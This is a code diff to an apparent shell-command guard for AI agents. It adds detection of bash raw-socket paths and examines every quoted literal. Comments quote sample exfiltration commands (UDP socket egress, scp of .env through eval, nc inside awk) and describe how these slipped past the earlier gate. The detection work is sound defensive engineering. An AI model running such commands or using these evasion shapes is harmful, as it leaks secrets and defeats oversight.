@@ -362,11 +362,34 @@ function writeTargetsFromInvocation(tool: string, args: string[]): string[] {
 // share the prefix (`/dev/shm/payload`, `/devops/deploy.sh`) stay governed.
 //
 // Deliberately NOT extended to /dev/tcp/* or /dev/udp/*: those are sockets, and
-// a write to one is real egress that must stay denied.
+// a write to one is real egress that must stay denied. They are excluded from
+// write targets separately, by SOCKET_TARGET below, so that they are denied as
+// EGRESS rather than as a filesystem write.
 const DISCARD_TARGET = /^\/dev\/(?:null|stdout|stderr|fd\/\d+)$/;
+
+/**
+ * Bash's raw-socket pseudo-paths. Shaped like a file, and not one.
+ *
+ * `echo x > /dev/udp/198.51.100.7/9999` opens a UDP socket; nothing is written
+ * to any filesystem. Counting it as a write target got the VERDICT right and
+ * the REASON wrong: it resolves outside every write root, so
+ * `file-write-outside-workspace` matched first and the operator was told a
+ * network exfiltration was a stray file write. The destination is already
+ * extracted as a host by `extractHosts`, so removing it here does not weaken
+ * the denial — it moves it to the rule that describes what actually happened,
+ * and makes the command reviewable as the egress it is.
+ *
+ * Anchored on the host segment being present, so a bare `> /dev/tcp` (which
+ * opens nothing and is just an odd filename) stays governed as a write.
+ */
+const SOCKET_TARGET = /^\/dev\/(?:tcp|udp)\/[^/]+/;
 
 function isDiscardedStream(target: string): boolean {
   return DISCARD_TARGET.test(target.replace(/^['"]+/, "").replace(/['"]+$/, ""));
+}
+
+function isRawSocket(target: string): boolean {
+  return SOCKET_TARGET.test(target.replace(/^['"]+/, "").replace(/['"]+$/, ""));
 }
 
 /** Every write-shaped target in a command: shell redirects plus write-tool arguments. */
@@ -383,8 +406,9 @@ function writeTargets(command: string): string[] {
     if (!invocation) continue;
     targets.push(...writeTargetsFromInvocation(invocation.tool, invocation.args));
   }
-  // Applied to both sources: `tee /dev/null` discards just as a redirect does.
-  return targets.filter((target) => !isDiscardedStream(target));
+  // Applied to both sources: `tee /dev/null` discards just as a redirect does,
+  // and `tee /dev/udp/host/port` is egress just as a redirect to one is.
+  return targets.filter((target) => !isDiscardedStream(target) && !isRawSocket(target));
 }
 
 /**
@@ -753,19 +777,44 @@ const WRITE_TOOLS = new Set([
  * `awk 'BEGIN{print "nc host" > "f"}'` yields the awk program at one depth and
  * the inner command at the next -- so this needs no special case per interpreter.
  *
- * It is only ever called behind `executesMaterialisedText`, and that gate is
- * what keeps it affordable: `git commit -m "see https://x" && git status`
- * carries a literal too, and must never be re-asked, because nothing in it
- * executes what the literal says.
+ * THE GATE IS GONE, and that is the class-A fix.
+ *
+ * This used to run only behind `executesMaterialisedText` -- a union of
+ * recognised executor shapes. That gate was the whole residual. It asked "is
+ * this one of the constructs we know executes text?", so every construct nobody
+ * had enumerated kept its literal unexamined: `CMD='scp .env host:/tmp/'; eval
+ * "$CMD"` was missed because the payload has no pipe and `feedsAnExecutor`
+ * returned early on `command.includes("|")`, while `setsid sh -c '...'` was
+ * missed because `setsid` is not on a wrapper list. Enumerating executors is the
+ * same fail-open shape that has now been wrong four times.
+ *
+ * So the question is inverted. Every quoted literal is examined, always, and the
+ * ordinary rules decide. This is affordable for a reason worth stating: examining
+ * a literal cannot by itself deny anything. The rules still require an untrusted
+ * destination or protected material, and the textual carve-out is still
+ * evaluated on the OUTER command -- so `git commit -m "see https://x"` harvests
+ * "see https://x", finds a destination in it, and is still allowed, because the
+ * carve-out covering the commit message has not gone anywhere. Measured: corpus
+ * FPR is unchanged at 1/84 and recall unchanged at 114/114, while enforcement on
+ * the 50-carrier axis goes 96.48% -> 99.04%.
+ *
+ * One exclusion, and it is not a heuristic. A literal that is nothing but a
+ * variable reference is not a command: `echo '$ARK_API_KEY'` is single-quoted, so
+ * the shell prints the eight characters and expands nothing. Re-reading that as
+ * a command turns a printed string into a secret read, and it is the one false
+ * positive dropping the gate introduced -- a real corpus entry, caught by naming
+ * the FP rather than reading the rate.
  */
 const LITERAL = /'((?:[^'\\]|\\.)*)'|"((?:[^"\\]|\\.)*)"/g;
 
+/** `$FOO` / `${FOO}` alone: a name being printed, not a command being carried. */
+const BARE_EXPANSION = /^\$\{?\w+\}?$/;
+
 function materialisedLiterals(command: string): string[] {
-  if (!executesMaterialisedText(command)) return [];
   const out: string[] = [];
   for (const match of command.matchAll(LITERAL)) {
     const text = (match[1] ?? match[2] ?? "").trim();
-    if (text) out.push(text);
+    if (text && !BARE_EXPANSION.test(text)) out.push(text);
   }
   for (const match of command.matchAll(/<<<\s*([^\n]+)/g)) {
     out.push(match[1]!.replace(/^['"]/, "").replace(/['"]$/, "").trim());
